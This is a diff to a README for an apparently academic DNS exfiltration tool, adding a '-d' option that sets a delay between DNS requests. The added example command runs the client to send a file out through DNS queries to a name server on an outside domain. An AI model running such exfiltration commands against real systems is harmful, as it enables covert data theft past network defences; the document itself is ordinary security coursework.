@@ -40,6 +40,13 @@ make compile
 Similar to the DNS exfiltration server, the domain that the name server is listening on (`cs5231.ianyong.com` in the example above) must be passed in as a command line argument.
 The client also takes in the path of the file to be exfiltrated.
 
+Optionally, the delay in milliseconds between DNS requests can be specified via the `-d` argument:
+```sh
+./dns-exfiltration-client -n cs5231.ianyong.com -f exfiltrate-this.txt -d 500
+```
+
+The above example adds a 500ms delay between the sending of each DNS request.
+
 ## Design Decisions
 
 ### Identifying Targets
